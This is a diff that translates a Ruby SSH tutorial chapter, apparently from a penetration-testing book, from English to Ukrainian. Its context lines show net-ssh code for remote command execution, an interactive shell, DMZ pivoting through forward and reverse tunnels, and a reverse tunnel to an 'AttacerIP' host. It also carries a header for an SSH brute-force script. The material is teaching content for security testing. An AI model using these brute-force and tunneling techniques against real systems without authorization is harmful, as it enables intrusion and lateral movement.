@@ -1,13 +1,14 @@
 # SSH
-Here we'll show some SSH using ruby. We'll need to install net-ssh gem for that.
+Тут ми покажемо як працювати з SSH в Рубі. Для цього нам треб буде встановити гем net-ssh.
 
-- To install net-ssh
+- Встановлення net-ssh
 ```
 gem install net-ssh
 ```
 
-## Simple SSH command execution 
-This is a very basic SSH client which sends and executes commands on a remote system 
+## Простий запуск команди в SSH
+Далі йде дуже простий SSH клієнт який відправляє і запускає команди на віддаленій системі:
+
 ```ruby
 #!/usr/bin/env ruby
 # KING SABRI | @KINGSABRI
@@ -28,8 +29,9 @@ rescue
 end
 ```
 
-## SSH Client with PTY shell
-Here a simple SSH client which give you an interactive PTY
+## SSH Клієнт з шелом PTY
+
+Наступний код - простий SSH клієнт який yfдає нам интерактивний шел PTY
 
 ```ruby
 #!/usr/bin/env ruby
@@ -42,26 +44,26 @@ require 'net/ssh'
 
 Net::SSH.start(@hostname, @username, :password => @password, :auth_methods => ["password"]) do |session|
 
-  # Open SSH channel 
+  # Відкриваємо канал SSH  
   session.open_channel do |channel|
     
-    # Requests that a pseudo-tty (or "pty") for interactive application-like (e.g vim, sudo, etc)
+    # Запитуємо pseudo-tty (or "pty") для інтерактивних програм(наприклад vim, sudo, etc)
     channel.request_pty do |ch, success| 
       raise "Error requesting pty" unless success 
 
-      # Request channel type shell
+      # Запитуємо тип каналу шелу
       ch.send_channel_request("shell") do |ch, success| 
         raise "Error opening shell" unless success
     	STDOUT.puts "[+] Getting Remote Shell\n\n" if success
       end
     end
 
-    # Print STDERR of the remote host to my STDOUT
+    # Виводимо STDERRвіддаленого сервера на наш STDOUT
     channel.on_extended_data do |ch, type, data|
       STDOUT.puts "Error: #{data}\n"
     end
 
-    # When data packets are received by the channel
+    # Коли пакети отримано
     channel.on_data do |ch, data|
       STDOUT.print data
       cmd = gets
@@ -78,7 +80,7 @@ Net::SSH.start(@hostname, @username, :password => @password, :auth_methods => ["
 end
 ```
 
-## SSH brute force 
+## Бруто-форс SSH 
 
 **ssh-bf.rb**
 ```ruby
@@ -122,9 +124,9 @@ hosts.each do |host|
 end end end
 ```
 
-## SSH Tunneling
+## Тунелювання SSH
 
-### Forward SSH Tunnel
+### Перенаправлення SSH тунелю
 
 ```
                               |--------DMZ------|---Local Farm----|
@@ -134,7 +136,7 @@ end end end
                               |-----------------|-----------------|
 ```
 
-Run ssh-ftunnel.rb on the **SSH Server** 
+Запустіть ssh-ftunnel.rb на **SSH Сервері** 
 
 **ssh-ftunnel.rb**
 ```ruby
@@ -150,15 +152,14 @@ Net::SSH.start("127.0.0.1", 'root', :password => '123132') do |ssh|
   ssh.loop { true }
 end
 ```
-
-Now connect to the **SSH Server** on port 3333 via your RDP client, you'll be prompt for the **WebServer**'s RDP log-in screen
+Тепер підключіться до **SSH Серверу** на порту 3333 з допомогою вашого RDP клієнту. Ви побачите інтерфейс RDP логіну на **Вебсервері(WebServer)**
 
 ```
 rdesktop WebServer:3333
 ```
 
 
-### Reverse SSH Tunnel 
+### Зворотній SSH тунель 
 ```
                               |--------DMZ------|---Local Farm----|
                               |                 |                 |
@@ -166,7 +167,7 @@ rdesktop WebServer:3333
   |   |                       |                 |                 |
   `->-'                       |-----------------|-----------------|
 ```
-Run ssh-rtunnel.rb on the **SSH Server** 
+Запустіть ssh-rtunnel.rb на **SSH Сервері** 
 
 **ssh-rtunnel.rb**
 ```ruby
@@ -182,8 +183,7 @@ Net::SSH.start("AttacerIP", 'attacker', :password => '123123') do |ssh|
   ssh.loop { true }
 end
 ```
-
-Now SSH from the **SSH Server** to **localhost** on the localhost's SSH port then  connect from your localhost to your localhost on port 3333 via your RDP client, you'll be prompt for the **WebServer**'s RDP log-in screen
+Тепер підключаєиося по SSH з **SSH Серверу** до **локальної машини(localhost)** на порту SSH локальної машини і далі підключаємося з вашого локального хоста до нього ж на порту 3333 за допомогою вашого RDP клієнту. Ви побачите інтерфейс RDP логіну на **Вебсервері(WebServer)**
 
 ```
 rdesktop localhost:3333
@@ -191,14 +191,14 @@ rdesktop localhost:3333
 
 
 
-## Copy files via SSH (SCP)
+## Копіювання файлів через SSH (SCP)
 
-- To install scp gem
+- Встановлення гему scp
 ```
 gem install net-scp
 ```
 
-- Upload file 
+- Завантаження файлу
 
 ```ruby
 require 'net/scp'
@@ -207,12 +207,12 @@ Net::SCP.upload!(
     		        "SSHServer", 
                     "root",
                     "/rubyfu/file.txt", "/root/", 
-                    #:recursive => true,    # Uncomment for recursive
+                    #:recursive => true,    # Розкоментуйте для рекурсивної передачі
                     :ssh => { :password => "123123" }
                 )
 ```
 
-- Download file 
+- Вивантаження файлу з сервера
 
 ```ruby
 require 'net/scp'
@@ -221,7 +221,7 @@ Net::SCP.download!(
     		        "SSHServer", 
                     "root",
                     "/root/", "/rubyfu/file.txt",
-                    #:recursive => true,    # Uncomment for recursive
+                    #:recursive => true,   # Розкоментуйте для рекурсивної передачі
                     :ssh => { :password => "123123" }
                   )
 ```
